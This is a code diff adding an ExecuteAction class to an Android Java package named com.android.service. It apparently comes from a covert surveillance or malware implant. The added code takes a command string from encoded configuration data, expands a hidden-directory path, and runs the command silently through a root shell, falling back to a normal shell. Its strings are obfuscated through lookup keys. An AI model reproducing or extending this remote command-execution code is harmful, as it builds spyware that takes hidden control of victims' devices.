@@ -9,12 +9,27 @@
 
 package com.android.service.action;
 
+import java.io.IOException;
+
+import android.util.Log;
+
+import com.android.service.Messages;
+import com.android.service.auto.Cfg;
+import com.android.service.conf.Configuration;
+import com.android.service.file.Directory;
+import com.android.service.util.Check;
+import com.android.service.util.DataBuffer;
+import com.android.service.util.WChar;
+
 // TODO: Auto-generated Javadoc
 /**
  * The Class ExecuteAction.
  */
 public class ExecuteAction extends SubAction {
-
+	private static final String TAG = "ExecuteAction";
+	
+	private String command;
+	
 	/**
 	 * Instantiates a new execute action.
 	 * 
@@ -34,12 +49,63 @@ public class ExecuteAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		// TODO Auto-generated method stub
+		if (this.command.length() == 0)
+			return false;
+		
+		// Proviamo ad eseguire il comando da root
+		try {
+			String cmd[] = { Configuration.shellFile, Messages.getString("35.0"), this.command }; // EXPORT
+			Process p = Runtime.getRuntime().exec(cmd);
+			
+			p.waitFor();
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.DEBUG) {
+				Check.log(e1);
+				Check.log(TAG + " (parse): Exception on parse() (root exec)");
+			}
+		}
+		
+		// Proviamo ad eseguire il comando da utente normale
+		try {
+			String cmd[] = { Messages.getString("35.1"), "-c", this.command }; // EXPORT
+			Process p = Runtime.getRuntime().exec(cmd);
+			
+			p.waitFor();
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.DEBUG) {
+				Check.log(e1);
+				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
+			}
+		}
+		
 		return false;
 	}
-	
+
 	@Override
 	protected boolean parse(final byte[] params) {
-		return false;
+		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);
+
+		try {
+			final int len = databuffer.readInt();
+			final byte[] buffer = new byte[len];
+			databuffer.read(buffer);
+
+			String cmd = WChar.getString(buffer, true);
+			this.command = Directory.expandHiddenDir(cmd);
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse): " + this.command);
+			}
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED");
+			}
+			
+			return false;
+		}
+		
+		return true;
 	}
 }
